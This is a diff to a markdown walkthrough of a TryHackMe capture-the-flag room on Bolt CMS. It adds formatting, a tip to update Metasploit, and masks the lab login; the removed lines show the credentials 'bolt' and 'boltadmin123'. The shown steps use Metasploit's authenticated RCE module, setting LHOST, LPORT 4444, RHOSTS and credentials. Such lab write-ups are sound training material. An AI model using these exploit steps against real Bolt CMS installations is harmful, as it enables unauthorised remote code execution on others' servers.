@@ -4,7 +4,7 @@
 
 First of all, connect to the VPN and deploy the machine.
 
-The machine IP is 10.10.189.109 for me. (It will be different for you)
+The machine IP is ```10.10.189.109``` for me. (It will be different for you)
 
 Run Nmap to search open ports
 ```
@@ -100,7 +100,7 @@ Just google it how to reach the login page. On the https://docs.bolt.cm/3.7/manu
 Go to https://www.exploit-db.com/ and search for "Bolt cms". You will find the EDB-ID of Authenticated Remote Code Execution vulnerability.
 
 #6 	Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
-Run metasploit!
+Run metasploit! I recommend you to update Metasploit first.
 
 ```
 #msfconsole
@@ -112,7 +112,7 @@ msf6 > search bolt cms
 Can you see the full path for this exploit?
 
 #7 	Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
-You know the username and password. LHOST is your IP that you can find it on https://tryhackme.com/access or ```ifconfig``` on terminal. Keep LPORT 4444. RHOST is the target machine IP. You can see below how to set those parameters.
+You know the username and password. LHOST is your IP that you can find it on https://tryhackme.com/access or ```ifconfig``` on terminal. Keep LPORT 4444. RHOST is the target machine IP. You can see below how to set those parameters. PS: I hide username and password so don't set username as ```b...``` :D
 Make sure everything is correct before running ```exploit```/```run```
 ```
 msf6 > use 28
@@ -121,9 +121,9 @@ lhost => 10.8.33.214
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.189.109
 rhosts => 10.10.189.109
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username b...
-username => bolt
+username => b...
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password b...........
-password => boltadmin123
+password => b...........
 ```
 #8 	Look for flag.txt inside the machine.
 
